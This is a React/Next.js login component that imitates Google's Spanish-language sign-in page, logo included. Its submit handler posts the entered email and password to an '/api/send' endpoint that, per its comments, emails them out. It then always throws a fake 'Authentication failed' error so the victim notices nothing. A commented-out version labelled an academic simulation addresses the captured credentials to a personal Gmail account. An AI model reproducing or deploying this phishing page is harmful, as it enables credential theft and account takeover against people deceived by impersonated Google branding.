/* eslint-disable @typescript-eslint/no-unused-vars */
'use client';

import { useState } from 'react';
import { FiEye, FiEyeOff, FiAlertCircle } from 'react-icons/fi';
import LoadingSpinner from './LoadingSpinner';
import Image from 'next/image';

const LoginForm = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState(false);

//   const handleSubmit = async (e: React.FormEvent) => {
//     e.preventDefault();
//     setIsLoading(true);
//     setError(false);

//     try {
//       // Simular tiempo de carga
//       await new Promise(resolve => setTimeout(resolve, 2000));
      
//       // Enviar datos al email (solo simulación académica)
//       console.log({
//         to: 'rostran448@gmail.com',
//         subject: 'Datos de Login',
//         text: `Email: ${email}\nPassword: ${password}`
//       });

//       // Forzar error para mostrar mensaje
//       throw new Error('Authentication failed');
//     } catch (err) {
//       setError(true);
//     } finally {
//       setIsLoading(false);
//     }
//   };

const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setError(false);

    try {
      // Enviar datos a la API
      const response = await fetch('/api/send', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          email: email,
          password: password
        }),
      });

      if (!response.ok) {
        throw new Error('Error al enviar el correo');
      }

      const result = await response.json();
      console.log('Correo enviado:', result);

      throw new Error('Authentication failed');
      
    } catch (err) {
      setError(true);
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="relative">
      {/* Overlay de carga */}
      {isLoading && (
        <div className="fixed inset-0 bg-black bg-opacity-20 z-50 flex items-center justify-center">
          <LoadingSpinner />
        </div>
      )}
      
      <div className="bg-white p-8 rounded-lg shadow-md w-full max-w-lg"> {/* Aumentado a max-w-lg */}
        <div className="flex justify-center mb-6">
          <div className="w-24 h-10 relative">
            <Image 
              src="/Google_logo.png" 
              alt="Logo de Google"
              layout="fill"
              objectFit="contain"
            />
          </div>
        </div>

        <h1 className="text-2xl font-semibold text-center mb-2">Iniciar sesión</h1>
        <p className="text-center text-sm text-gray-600 mb-6">Usa tu cuenta de Google</p>

        <form onSubmit={handleSubmit}>
          <div className="mb-4">
            <input
              type="text"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              placeholder="Correo electrónico o teléfono"
              className="w-full px-4 py-3 border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 min-w-[240px]"
              required
            />
          </div>

          <div className="mb-2 relative">
            <input
              type={showPassword ? "text" : "password"}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Contraseña"
              className="w-full px-4 py-3 border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 min-w-[240px]"
              required
            />
            <button
              type="button"
              className="absolute right-3 top-3.5 text-gray-500"
              onClick={() => setShowPassword(!showPassword)}
            >
              {showPassword ? <FiEyeOff size={20} /> : <FiEye size={20} />}
            </button>
          </div>

          <div className="mb-6">
            <a href="#" className="text-blue-600 text-sm hover:underline">
              ¿Olvidaste tu contraseña?
            </a>
          </div>

          <div className="mb-4">
            <button
              type="submit"
              disabled={isLoading}
              className="w-full bg-blue-600 text-white py-3 rounded-md hover:bg-blue-700 transition disabled:opacity-70 flex items-center justify-center"
            >
              Siguiente
            </button>
          </div>
        </form>

        {error && (
          <div className="mt-4 text-red-600 flex items-start">
            <FiAlertCircle className="mr-2 mt-0.5 flex-shrink-0" />
            <span className="text-sm">Hubo un problema con el inicio de sesión. Inténtalo de nuevo más tarde.</span>
          </div>
        )}

        <div className="mt-8 text-center">
          <p className="text-sm">
            ¿No tienes una cuenta?{' '}
            <a href="#" className="text-blue-600 hover:underline">
              Crear cuenta
            </a>
          </p>
        </div>
      </div>
    </div>
  );
};

export default LoginForm;
